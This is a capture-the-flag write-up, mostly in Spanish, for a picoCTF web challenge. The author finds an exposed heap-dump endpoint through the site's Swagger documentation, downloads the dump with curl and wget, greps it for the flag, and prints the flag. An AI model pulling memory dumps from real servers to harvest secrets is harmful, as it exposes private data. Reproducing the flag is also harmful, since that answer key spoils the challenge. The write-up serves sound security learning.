
Description
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.
The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.
The website is running picoCTF News

nos da un link al cual vamos a entrar
nos vamos a enfocar en el apartado de 
Explora el desarrollo backend con nosotros #nodejs , #swagger UI , #API Documentación
asi como indica en el reto

nos vamos al ultimo que se llama como el reto y lo ejecutamos
y nos da un archivo para descargar, pero tambien nos da una lista de comandos para hacer la busqueda

curl -X 'GET' \
  'http://verbal-sleep.picoctf.net:52779/heapdump' \
  -H 'accep: */*'

le hacemos un cat al archivo juto con un grep pico para que nos de la bandera

 wget http://verbal-sleep.picoctf.net:52779/heapdump


luisquintero@DESKTOP-P53ABHB:~$ cat heapdump |grep pico
picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}
"\nwindow.onload = function() {\n  // Build a system\n  var url = window.location.search.match(/url=([^&]+)/);\n  if (url && url.length > 1) {\n    url = decodeURIComponent(url[1]);\n  } else {\n    url = window.location.origin;\n  }\n  var options = {\n  \"swaggerDoc\": {\n    \"openapi\": \"3.0.0\",\n    \"info\": {\n      \"title\": \"picoCTF News API\",\n      \"version\": \"1.0.0\",\n      \"description\": \"Welcome to the picoCTF News API documentation! This documentation provides a detailed overview of the available API endpoints for managing and retrieving news posts.\"\n    },\n    \"paths\": {\n      \"/\": {\n        \"get\": {\n          \"tags\": [\n            \"Free\"\n          ],\n          \"summary\": \"Welcome page\",\n          \"responses\": {\n            \"200\": {\n              \"description\": \"Returns a welcome message.\"\n            }\n          }\n        }\n      },\n      \"/about\": {\n        \"get\": {\n          \"tags\": [\n            \"Free\"\n          ],\n          \"summary\": \"About Us\",\n          \"responses\": {\n            \"200\": {\n              \"desc",
"Welcome to the picoCTF News API documentation! This documentation provides a detailed overview of the available API endpoints for managing and retrieving news posts.",
"picoCTF News API",
"verbal-sleep.picoctf.net:52779",
luisquintero@DESKTOP-P53ABHB:~$


Y ahi nos sale la bandera
picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}


Bandera

picoCTF{Pat!3nt_15_Th3_K3y_f1179e46}

Referencias
https://www.youtube.com/watch?v=k1OJJ70v9nk

